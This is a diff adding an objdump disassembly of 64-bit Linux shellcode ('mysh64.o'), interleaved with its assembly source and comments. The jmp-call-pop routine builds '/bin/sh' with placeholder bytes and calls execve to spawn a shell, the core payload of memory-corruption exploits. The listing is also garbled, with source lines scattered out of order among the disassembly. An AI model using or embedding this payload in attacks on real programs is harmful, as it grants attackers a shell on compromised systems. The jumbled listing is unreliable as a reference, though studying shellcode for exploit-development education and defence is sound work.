@@ -1,0 +1,41 @@
+
+mysh64.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <_start>:
+section .text
+  global _start
+    _start:
+    BITS 64
+    jmp short two
+   0:	eb 20                	jmp    22 <two>
+
+0000000000000002 <one>:
+   2:	5b                   	pop    rbx
+   3:	48 89 5b 08          	mov    QWORD PTR [rbx+0x8],rbx
+    one:
+     pop rbx           
+
+     mov [rbx+8],  rbx  ; store rbx to memory at address rbx + 8
+   7:	48 31 c0             	xor    rax,rax
+   a:	88 43 07             	mov    BYTE PTR [rbx+0x7],al
+   d:	48 89 43 10          	mov    QWORD PTR [rbx+0x10],rax
+     xor rax, rax ; remove 0 in the rax register
+  11:	48 89 df             	mov    rdi,rbx
+     mov[rbx+7], al ; store 0 (second arg at the 8th place / bin / sh 0)
+  14:	48 8d 73 08          	lea    rsi,[rbx+0x8]
+  18:	48 31 d2             	xor    rdx,rdx
+     mov [rbx+16], rax  ; store rax to memory at address rbx + 16
+  1b:	48 31 c0             	xor    rax,rax
+  1e:	b0 3b                	mov    al,0x3b
+  20:	0f 05                	syscall 
+
+0000000000000022 <two>:
+
+     mov rdi, rbx       ; rdi = rbx
+  22:	e8 db ff ff ff 2f 62 69 6e 2f 73 68 ff 41 41 41     ...../bin/sh.AAA
+     lea rsi, [rbx+8]   ; rsi = rbx + 8    
+     xor rdx, rdx ; remove 0 in the rdx
+  32:	41 41 41 41 41 42 42 42 42 42 42 42 42              AAAAABBBBBBBB
